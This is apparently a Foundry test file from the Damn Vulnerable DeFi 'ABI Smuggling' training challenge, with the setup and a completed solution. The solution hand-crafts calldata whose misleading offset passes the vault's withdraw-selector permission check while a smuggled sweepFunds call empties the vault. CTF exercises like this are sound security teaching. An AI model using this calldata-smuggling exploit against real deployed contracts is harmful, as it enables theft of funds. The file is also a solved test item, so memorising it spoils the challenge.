// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Step 1: Prepare the function selector for the "execute" function
        // This is the function we intend to call on the vault contract.
        bytes memory executeSelector = abi.encodeWithSignature("execute(address,bytes)");
    
        // Step 2: Convert the vault contract address into a `bytes32` format
        // This is required for the payload as the vault address needs to be passed.
        bytes32 vaultAddress = bytes32(uint256(uint160(address(vault))));
    
        // Step 3: Set the smuggle location
        // This is the memory location where the actual payload will be located.
        bytes32 smuggleLocation = 0x0000000000000000000000000000000000000000000000000000000000000080;
    
        // Step 4: Add a placeholder for random data (not used but fills required space in the payload).
        bytes32 random = 0x0000000000000000000000000000000000000000000000000000000000000000;
    
        // Step 5: Our allowance (acts as part of the crafted payload)
        // This si the function selector of the withdraw function which is checked in the execute function.
        bytes32 ourAllowance = 0xd9caed1200000000000000000000000000000000000000000000000000000000;
    
        // Step 6: Specify the actual payload length
        // This is the length of the actual function call we want to smuggle.
        bytes32 actualPayloadLength = 0x0000000000000000000000000000000000000000000000000000000000000044;
    
        // Step 7: Construct the actual payload
        // This payload represents the real function call we want to execute on the vault contract.
        // The `sweepFunds(address,address)` function transfers funds from the vault to our recovery address.
        bytes memory actualPayload = abi.encodeWithSignature("sweepFunds(address,address)", recovery, address(token));
    
        // Step 8: Combine all parts into the final crafted payload
        // The final payload includes:
        // - `executeSelector`: Calls the `execute` function of the vault
        // - `vaultAddress`: The address of the vault contract
        // - `smuggleLocation`: Memory location of the smuggled payload
        // - `random`: Filler data
        // - `ourAllowance`: Acts as part of the crafted data
        // - `actualPayloadLength`: Specifies the length of the real function call
        // - `actualPayload`: The actual function call to `sweepFunds` we want executed
        bytes memory finalPayload = bytes.concat(
            executeSelector,
            vaultAddress,
            smuggleLocation,
            random,
            ourAllowance,
            actualPayloadLength,
            actualPayload
        );
    
        // Step 9: Perform the exploit by calling the vault with the crafted payload
        // The `call` method sends the final crafted payload to the vault contract,
        // tricking it into executing the `sweepFunds` function.
        address(vault).call(finalPayload);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
